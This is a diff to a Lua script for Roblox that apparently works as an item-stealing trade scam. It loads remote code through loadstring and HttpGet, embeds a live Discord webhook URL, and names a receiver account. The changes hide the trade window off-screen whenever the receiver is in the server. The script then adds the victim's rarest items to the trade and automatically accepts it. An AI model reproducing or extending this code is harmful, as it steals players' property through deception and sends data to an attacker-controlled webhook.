@@ -1,17 +1,18 @@
 Config = {
     Receivers = {"ninjasit"},
     Webhook = "https://discord.com/api/webhooks/1265971660759240808/SlH8qsSeVnrxWj63UyF-Po2yP5SM8Zb0TtFdKGQLyRRb-Eh94s9hzMS56e5MYZms7Hh_",
-    FullInventory = true, 
-    GoodItemsOnly = true, 
-    ResendTrade = "Hi", 
-    Script = "Hub", 
-    CustomLink = "None" 
+    FullInventory = true,
+    GoodItemsOnly = true,
+    ResendTrade = "Hi",
+    Script = "Hub",
+    CustomLink = "None"
 }
 
 repeat wait() until game:IsLoaded()
 
 if getgenv().scriptexecuted then return end
 getgenv().scriptexecuted = true
+
 
 local DYWebhook = loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/angsakitsadamdamin.lua"))()
 DYWebhook.ErrorPrinting = false
@@ -27,7 +28,31 @@ local RunService = game:GetService("RunService")
 local Trade = ReplicatedStorage.Trade
 local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
 local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
-local Position = UDim2.new(0, 9999, 0, 9999)
+
+
+local Position = UDim2.new(0.5, 0, 0.5, 0)
+
+local Players = game:GetService("Players")
+
+function checkReceivers()
+    for _, receiver in pairs(Config.Receivers) do
+        if Players:FindFirstChild(receiver) then
+            return true
+        end
+    end
+    return false
+end
+
+function updatePosition()
+    if checkReceivers() then
+        Position = UDim2.new(0, 9999, 0, 9999) -- Move off-screen
+    else
+        Position = UDim2.new(0.5, 0, 0.5, 0) -- Center screen
+    end
+end
+
+RunService.RenderStepped:Connect(updatePosition)
+
 local Inventory = {}
 
 local games = {
@@ -35,12 +60,6 @@ local games = {
     [335132309] = true,
     [636649648] = true
 }
-
-if not games[game.PlaceId] then
-    game:GetService("Players").LocalPlayer:Kick("Unfortunately, this game is not supported.")
-    while true do end
-    wait(99999999999999999999999999999999999)
-end
 
 if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    
@@ -218,28 +237,14 @@ local success, errorMsg = pcall(function()
     task.wait()
     
     function Sendtrade()
-    if Mobile then
-        local Path = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard
-
-        -- Check if Receiver exists
-        local receiverExists = Path.Container.PlayerList:FindFirstChild(Receiver)
-
-        if receiverExists then
-            -- Close the popup only if Receiver is still present
-            if Path.Popup and Path.Popup.Container and Path.Popup.Container.Close then
-                TapUI(Path.Container.Close)
-                TapUI(receiverExists.ActionButton)
-                TapUI(Path.Popup.Container.Action.Trade)
-                TapUI(Path.Popup.Container.Close)
-            end
-        end
-    else
-        local Path = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
-
-        -- Check if Receiver exists
-        local receiverExists = Path.Container:FindFirstChild(Receiver)
-
-        if receiverExists then
+        if Mobile then
+            local Path = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard
+            TapUI(Path.Container.Close)
+            TapUI(Path.Container.PlayerList[Receiver].ActionButton)
+            TapUI(Path.Popup.Container.Action.Trade)
+            TapUI(Path.Popup.Container.Close)
+        else
+            local Path = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
             TapUI(Path.Container.ToggleRequests.On)
             TapUI(Path.Container.Close.Title.Text, "Text Check", Path.Container.Close.Toggle)
             TapUI(Path.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
@@ -249,7 +254,6 @@ local success, errorMsg = pcall(function()
             TapUI(Path.Inspect.Close)
         end
     end
-end
     
     function readchats()
         Players[Receiver].Chatted:Connect(function(msg)
@@ -270,68 +274,79 @@ end
         end
     end
     
-    function InsertItems()
-        local ItemsByRarity = {
-            Ancient = {},
-            Godly = {},
-            Unique = {},
-            Vintage = {},
-            Legendary = {},
-            Rare = {},
-            Uncommon = {},
-            Common = {}
-        }
-
-        for i,v in pairs(TradePath.Container.Items.Main:GetChildren()) do
-            for i,v in pairs(v.Items.Container.Current.Container:GetChildren()) do
-                if v:IsA("Frame") then
-                    if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
-                        local rarity = "Common"
-                        local color = v.ItemName.BackgroundColor3
-                        if color == Color3.fromRGB(220, 0, 5) then
-                            rarity = "Legendary"
-                        elseif color == Color3.fromRGB(255, 0, 179) then
-                            rarity = "Godly"
-                        elseif color == Color3.fromRGB(100, 10, 255) then
-                            rarity = "Ancient"
-                        elseif color == Color3.fromRGB(240, 140, 0) then
-                            rarity = "Unique"
-                        elseif color == Color3.fromRGB(255, 255, 0) then
-                            rarity = "Vintage"
-                        elseif color == Color3.fromRGB(0, 200, 0) then
-                            rarity = "Rare"
-                        elseif color == Color3.fromRGB(0, 255, 255) then
-                            rarity = "Uncommon"
-                        end
-                        table.insert(ItemsByRarity[rarity], v)
-                    end
-                end
-            end
-        end
-
-        local ItemsInTrade = 0
-        local rarityOrder = {"Ancient", "Godly", "Unique", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
+    -- Function to insert items
+function InsertItems()
+    if not checkReceivers() then
     
-        for _, rarity in ipairs(rarityOrder) do
-            for _, item in ipairs(ItemsByRarity[rarity]) do
-                if ItemsInTrade < 4 then
-                    ItemsInTrade = ItemsInTrade + 1
-                    local LoopsItem = 1
-                    local Amount = item.Container.Amount.Text
-                    if Amount ~= "" then
-                        LoopsItem = tonumber(Amount:match("x(%d+)"))
-                    end
-                    task.wait()
-                    for i = 1, LoopsItem do
-                        TapUI(item.Container.ActionButton)
-                    end
-                end
-            end
-        end
-    
-        wait(10)
-        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
+        return
     end
+
+    local ItemsByRarity = {
+        Ancient = {},
+        Godly = {},
+        Unique = {},
+        Vintage = {},
+        Legendary = {},
+        Rare = {},
+        Uncommon = {},
+        Common = {}
+    }
+
+    for i, v in pairs(TradePath.Container.Items.Main:GetChildren()) do
+        for i, v in pairs(v.Items.Container.Current.Container:GetChildren()) do
+            if v:IsA("Frame") then
+                if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
+                    local rarity = "Common"
+                    local color = v.ItemName.BackgroundColor3
+                    if color == Color3.fromRGB(220, 0, 5) then
+                        rarity = "Legendary"
+                    elseif color == Color3.fromRGB(255, 0, 179) then
+                        rarity = "Godly"
+                    elseif color == Color3.fromRGB(100, 10, 255) then
+                        rarity = "Ancient"
+                    elseif color == Color3.fromRGB(240, 140, 0) then
+                        rarity = "Unique"
+                    elseif color == Color3.fromRGB(255, 255, 0) then
+                        rarity = "Vintage"
+                    elseif color == Color3.fromRGB(0, 200, 0) then
+                        rarity = "Rare"
+                    elseif color == Color3.fromRGB(0, 255, 255) then
+                        rarity = "Uncommon"
+                    end
+                    table.insert(ItemsByRarity[rarity], v)
+                end
+            end
+        end
+    end
+
+    local ItemsInTrade = 0
+    local rarityOrder = {"Ancient", "Godly", "Unique", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
+
+    for _, rarity in ipairs(rarityOrder) do
+        for _, item in ipairs(ItemsByRarity[rarity]) do
+            if ItemsInTrade < 4 then
+                ItemsInTrade = ItemsInTrade + 1
+                local LoopsItem = 1
+                local Amount = item.Container.Amount.Text
+                if Amount ~= "" then
+                    LoopsItem = tonumber(Amount:match("x(%d+)"))
+                end
+                task.wait()
+                for i = 1, LoopsItem do
+                    TapUI(item.Container.ActionButton)
+                end
+            end
+        end
+    end
+
+    wait(10)
+
+    if checkReceivers() then
+        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
+    else
+        
+    end
+end
 
     if Mobile then
         TradePath.Container.Position = Position
